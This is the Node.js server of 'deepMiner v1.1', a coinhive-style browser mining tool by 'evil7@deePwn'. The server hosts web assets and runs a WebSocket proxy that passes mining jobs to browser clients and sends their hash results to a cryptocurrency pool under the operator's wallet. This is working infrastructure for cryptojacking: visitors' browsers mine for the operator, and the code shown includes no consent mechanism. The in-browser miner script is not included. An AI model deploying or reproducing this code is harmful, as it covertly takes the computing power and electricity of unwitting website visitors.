/**
 * deepMiner v1.1
 * Idea from coinhive.com
 * Worker for any pool or personal wallet
 * By evil7@deePwn
 */

var http = require('http'),
	WebSocket = require("ws"),
	net = require('net'),
	fs = require('fs');

var banner = fs.readFileSync(__dirname + '/banner', 'utf8');
var conf = fs.readFileSync(__dirname + '/config.json', 'utf8');
conf = JSON.parse(conf);

//heroku port
conf.lport = process.env.PORT || conf.lport;
conf.domain = process.env.DOMAIN || conf.domain;

//HTTP srv
var web = http.createServer((req, res) => {
	res.setHeader('Access-Control-Allow-Origin', '*');
	req.url = (req.url === '/') ? '/index.html' : req.url;
	fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
		if (err) {
			fs.readFile(__dirname + '/web/404.html', (err, buf) => {
				res.end(buf);
			});
		} else {
			if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
				buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
				if (req.url.match(/\.js$/)) {
					res.setHeader('content-type', 'application/javascript');
				}
			} else {
				res.setHeader('Content-Type', 'application/octet-stream');
			}
			res.end(buf);
		}
	});
});

// Miner Proxy Srv
var srv = new WebSocket.Server({
	server: web,
	path: "/proxy",
	maxPayload: 256
});
srv.on('connection', (ws) => {
	var conn = {
		uid: null,
		pid: new Date().getTime(),
		workerId: null,
		found: 0,
		accepted: 0,
		ws: ws,
		pl: new net.Socket(),
	}
	var pool = conf.pool.split(':');
	conn.pl.connect(pool[1], pool[0]);

	// Trans WebSocket to PoolSocket
	function ws2pool(data) {
		var buf;
		data = JSON.parse(data);
		switch (data.type) {
			case 'auth':
				{
					conn.uid = data.params.site_key;
					if (data.params.user) {
						conn.uid += '@' + data.params.user;
					}
					buf = {
						"method": "login",
						"params": {
							"login": conf.addr,
							"pass": conf.pass,
							"agent": "deepMiner"
						},
						"id": conn.pid
					}
					buf = JSON.stringify(buf) + '\n';
					conn.pl.write(buf);
					break;
				}
			case 'submit':
				{
					conn.found++;
					buf = {
						"method": "submit",
						"params": {
							"id": conn.workerId,
							"job_id": data.params.job_id,
							"nonce": data.params.nonce,
							"result": data.params.result
						},
						"id": conn.pid
					}
					buf = JSON.stringify(buf) + '\n';
					conn.pl.write(buf);
					break;
				}
		}
	}

	// Trans PoolSocket to WebSocket
	function pool2ws(data) {
		var buf;
		data = JSON.parse(data);
		if (data.id === conn.pid && data.result) {
			if (data.result.id) {
				conn.workerId = data.result.id;
				buf = {
					"type": "authed",
					"params": {
						"token": "",
						"hashes": conn.accepted
					}
				}
				buf = JSON.stringify(buf);
				conn.ws.send(buf,function(error) {
					// Do something in here here to clean things up (or don't do anything at all)
				});
				buf = {
					"type": 'job',
					"params": data.result.job
				}
				buf = JSON.stringify(buf);
				conn.ws.send(buf,function(error) {
					// Do something in here here to clean things up (or don't do anything at all)
				});
			} else if (data.result.status === 'OK') {
				conn.accepted++;
				buf = {
					"type": "hash_accepted",
					"params": {
						"hashes": conn.accepted
					}
				}
				buf = JSON.stringify(buf);
				conn.ws.send(buf,function(error) {
					// Do something in here here to clean things up (or don't do anything at all)
				});
			}
		}
		if (data.id === conn.pid && data.error) {
			if (data.error.code === -1) {
				buf = {
					"type": "banned",
					"params": {
						"banned": conn.pid
					}
				}
			} else {
				buf = {
					"type": "error",
					"params": {
						"error": data.error.message
					}
				}
			}
			buf = JSON.stringify(buf);
			conn.ws.send(buf,function(error) {
				// Do something in here here to clean things up (or don't do anything at all)
			});
		}
		if (data.method === 'job') {
			buf = {
				"type": 'job',
				"params": data.params
			}
			buf = JSON.stringify(buf);
			conn.ws.send(buf,function(error) {
				// Do something in here here to clean things up (or don't do anything at all)
			});
		}
	}
	conn.ws.on('message', (data) => {
		ws2pool(data);
		console.log('[>] Request: ' + conn.uid + '\n\n' + data + '\n');
	});
	conn.ws.on('error', (data) => {
		console.log('[!] ' + conn.uid + ' WebSocket ' + data + '\n');
		conn.pl.destroy();
	});
	conn.ws.on('close', () => {
		console.log('[!] ' + conn.uid + ' offline.\n');
		conn.pl.destroy();
	});
	conn.pl.on('data', (data) => {
		pool2ws(data);
		console.log('[<] Response: ' + conn.uid + '\n\n' + data + '\n');
	});
	conn.pl.on('error', (data) => {
		console.log('PoolSocket ' + data + '\n');
		if (conn.ws.readyState !== 3) {
			conn.ws.close();
		}
	});
	conn.pl.on('close', () => {
		console.log('PoolSocket Closed.\n');
		if (conn.ws.readyState !== 3) {
			conn.ws.close();
		}
	});
});
web.listen(conf.lport, conf.lhost, () => {
	console.log(banner);
	console.log(' Listen on : ' + conf.lhost + ':' + conf.lport + '\n Pool Host : ' + conf.pool + '\n Ur Wallet : ' + conf.addr + '\n');
	console.log('----------------------------------------------------------------------------------------\n');
});
